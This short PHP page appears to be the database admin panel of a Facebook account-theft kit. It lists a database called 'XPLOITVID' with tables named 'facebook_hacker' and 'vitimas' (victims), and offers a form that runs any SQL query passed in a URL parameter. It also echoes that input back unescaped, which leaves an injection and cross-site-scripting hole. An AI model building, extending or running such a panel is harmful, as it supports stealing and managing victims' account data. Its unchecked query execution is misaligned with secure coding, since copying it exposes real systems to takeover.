<form>
	<div>Executa Query</div>
	<div>UPDATE =>  <span>UPDATE usuarios SET nivel = '1' WHERE nivel = '0' </span></div>
	<div>DELETE =>  <span>DELETE FROM usuarios WHERE id = '1' </span></div>
	<input type="hidden" name="p" value="db.php">
	<input type="text" name="query"> <button>Executar</button>
</form><br>
<?php
if (isset($_GET['query'])) {
	$query = $_GET['query'];
	if (executa_query($query) === TRUE) {
		echo "<div style='color:green;'>Sucesso => ".$_GET['query']."</div>";
	}else {echo "<div style='color:red;'>Erro => ".$_GET['query']."</div>";}
}
?>
<details>
	<ul>
		<li>XPLOITVID
			<ul>
				<li>facebook_hacker</li>
				<li>usuarios</li>
				<li>visualizacao</li>
				<li>vitimas</li>
			</ul>
		</li>
	</ul>
</details>